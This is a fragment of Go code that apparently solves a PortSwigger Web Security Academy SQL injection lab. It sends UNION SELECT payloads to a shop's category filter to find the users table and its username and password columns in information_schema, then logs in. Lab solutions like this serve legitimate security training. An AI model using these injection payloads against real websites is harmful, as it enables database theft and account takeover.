...
func solve() error {
	...
	u := "https://0af3007804d3a3e4c0bb31b5004700cf.web-security-academy.net"
	filterUrl := u + "/filter"
	loginUrl := u + "/login"
...
func usersTable(u string, numCols, textCol int, client *http.Client) (string, error) {
	...
	filterUrl := u + "?category=" + url.QueryEscape("Gifts' union select "+strings.Join(nulls, ",")+" from information_schema.tables--")
	fmt.Println(filterUrl)
	resp, err := client.Get(filterUrl)
	if err != nil {
		return "", err
...
func userPassColumns(u string, numCols, textCol int, usersTable string, client *http.Client) (string, string, error) {
	...
	filterUrl := u + "?category=" + url.QueryEscape("Gifts' union select "+strings.Join(nulls, ",")+" from information_schema.columns where table_name = '"+usersTable+"'--")
	fmt.Println(filterUrl)
	resp, err := client.Get(filterUrl)
	if err != nil {
		return "", "", err
